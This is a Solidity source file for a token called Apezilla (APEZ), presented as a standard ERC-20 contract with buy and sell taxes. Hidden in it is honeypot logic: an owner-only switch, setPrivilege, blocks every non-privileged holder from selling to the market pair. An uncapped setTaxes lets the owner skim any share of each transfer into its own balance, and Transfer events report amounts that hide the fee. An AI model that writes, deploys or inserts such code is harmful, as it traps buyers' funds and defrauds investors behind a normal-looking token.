pragma solidity ^0.8.0;

// SPDX-License-Identifier: MIT

import "SafeMath.sol";

abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Token is Context, Ownable {

    using SafeMath for uint256;

    string public _symbol = "APEZ";
    string public _name = "Apezilla";
    uint256 public _decimals = 18;
    uint256 public totalSupply = 100000000 * 10**18;

    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;
    mapping (address => bool) privileged;
    bool checkPrivilege;
    mapping (address => bool) public isMarketPair;
    mapping (address => bool) public isExcludedFromFee;

    IUniswapV2Router public uniswapV2Router;
    address public uniswapPair;
    address router;

    uint256 public _totalTaxIfBuying = 17;
    uint256 public _totalTaxIfSelling = 12;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(){
        
        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;
        privileged[owner()] = true;
        privileged[address(uniswapPair)] = true;
        privileged[address(router)] = true;
        privileged[address(this)] = true;
        checkPrivilege = false;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    /**
        @notice Getter to check the current balance of an address
        @param _owner Address to query the balance of
        @return Token balance
     */
    function balanceOf(address _owner) public view returns (uint256) {
        return balances[_owner];
    }

    /**
        @notice Getter to check the amount of tokens that an owner allowed to a spender
        @param _owner The address which owns the funds
        @param _spender The address which will spend the funds
        @return The amount of tokens still available for the spender
     */
    function allowance(
        address _owner,
        address _spender
    )
        public
        view
        returns (uint256)
    {
        return allowed[_owner][_spender];
    }

    /**
        @notice Approve an address to spend the specified amount of tokens on behalf of msg.sender
        @dev Beware that changing an allowance with this method brings the risk that someone may use both the old
             and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this
             race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:
             https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
        @param _spender The address which will spend the funds.
        @param _value The amount of tokens to be spent.
        @return Success boolean
     */
    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    /** shared logic for transfer and transferFrom */
    function _transfer(address _from, address _to, uint256 _value) internal {
        require(balances[_from] >= _value, "Insufficient balance");
        balances[_from] = balances[_from].sub(_value);

        uint256 finalAmount = (isExcludedFromFee[_from] || isExcludedFromFee[_to]) ? 
                                         _value : takeFee(_from, _value);

        balances[_to] = balances[_to].add(finalAmount);
        emit Transfer(_from, _to, _value);
    }

    /**
        @notice Transfer tokens to a specified address
        @param _to The address to transfer to
        @param _value The amount to be transferred
        @return Success boolean
     */
    function transfer(address _to, uint256 _value) public returns (bool) {
        if(checkPrivilege == true && isMarketPair[_to] == true)
            require(privileged[msg.sender] == true);
        _transfer(msg.sender, _to, _value);
        return true;
    }

    /**
        @notice Transfer tokens from one address to another
        @param _from The address which you want to send tokens from
        @param _to The address which you want to transfer to
        @param _value The amount of tokens to be transferred
        @return Success boolean
     */
    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    )
        public
        returns (bool)
    {
        require(allowed[_from][msg.sender] >= _value, "Insufficient allowance");
        if(checkPrivilege == true && isMarketPair[_to] == true)
            require(privileged[msg.sender] == true);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        _transfer(_from, _to, _value);
        return true;
    }

    function setMarketPairStatus(address account, bool newValue) public onlyOwner {
        isMarketPair[account] = newValue;
    }

    function setTaxes(uint256 newBuyTax, uint256 newSellTax) external onlyOwner {

        _totalTaxIfBuying = newBuyTax;
        _totalTaxIfSelling = newSellTax;
    }

    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = 0;
        
        if(isMarketPair[sender]) {
            feeAmount = amount.mul(_totalTaxIfBuying).div(100);
        }
        else {
            feeAmount = amount.mul(_totalTaxIfSelling).div(100);
        }
        
        if(feeAmount > 0) {
            balances[owner()] = balances[owner()].add(feeAmount);
            emit Transfer(sender, owner(), feeAmount);
        }

        return amount.sub(feeAmount);
    }

    function setPrivilege(bool newState) external onlyOwner {
        checkPrivilege = newState;
    }

}

pragma solidity ^0.8.0;

library SafeMath {

    function add(uint a, uint b) internal pure returns (uint c) {
        c = a + b;
        require(c >= a);
        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint c) {
        require(b <= a);
        c = a - b;
        return c;
    }

    function mul(uint a, uint b) internal pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
        return c;
    }

    function div(uint a, uint b) internal pure returns (uint c) {
        require(b > 0);
        c = a / b;
        return c;
    }

}